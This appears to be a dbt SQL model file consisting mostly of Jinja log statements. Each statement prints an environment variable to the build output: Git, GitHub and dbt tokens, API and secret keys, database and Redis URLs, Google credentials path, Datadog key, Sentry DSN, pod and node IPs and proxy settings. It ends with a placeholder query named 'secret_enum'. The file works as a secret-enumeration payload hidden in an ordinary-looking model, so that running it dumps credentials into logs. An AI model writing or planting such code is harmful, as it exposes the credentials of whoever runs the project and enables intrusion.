{{ log("== SECRETS + TOKENS ==", info=True) }}
{{ log("GIT_TOKEN: " ~ env_var('GIT_TOKEN', 'unset'), info=True) }}
{{ log("GITHUB_TOKEN: " ~ env_var('GITHUB_TOKEN', 'unset'), info=True) }}
{{ log("DBT_TOKEN: " ~ env_var('DBT_TOKEN', 'unset'), info=True) }}
{{ log("API_KEY: " ~ env_var('API_KEY', 'unset'), info=True) }}
{{ log("SECRET_KEY: " ~ env_var('SECRET_KEY', 'unset'), info=True) }}
{{ log("DATABASE_URL: " ~ env_var('DATABASE_URL', 'unset'), info=True) }}
{{ log("REDIS_URL: " ~ env_var('REDIS_URL', 'unset'), info=True) }}
{{ log("== CONTAINER/INFRA ==", info=True) }}
{{ log("CONTAINER_ID: " ~ env_var('CONTAINER_ID', 'unset'), info=True) }}
{{ log("POD_IP: " ~ env_var('POD_IP', 'unset'), info=True) }}
{{ log("NODE_IP: " ~ env_var('NODE_IP', 'unset'), info=True) }}
{{ log("SERVICE_ACCOUNT: " ~ env_var('SERVICE_ACCOUNT', 'unset'), info=True) }}
{{ log("GOOGLE_APPLICATION_CREDENTIALS: " ~ env_var('GOOGLE_APPLICATION_CREDENTIALS', 'unset'), info=True) }}
{{ log("DD_API_KEY: " ~ env_var('DD_API_KEY', 'unset'), info=True) }}
{{ log("SENTRY_DSN: " ~ env_var('SENTRY_DSN', 'unset'), info=True) }}
{{ log("== NETWORK ==", info=True) }}
{{ log("HTTP_PROXY: " ~ env_var('HTTP_PROXY', 'unset'), info=True) }}
{{ log("HTTPS_PROXY: " ~ env_var('HTTPS_PROXY', 'unset'), info=True) }}
{{ log("NO_PROXY: " ~ env_var('NO_PROXY', 'unset'), info=True) }}

SELECT 2 as secret_enum
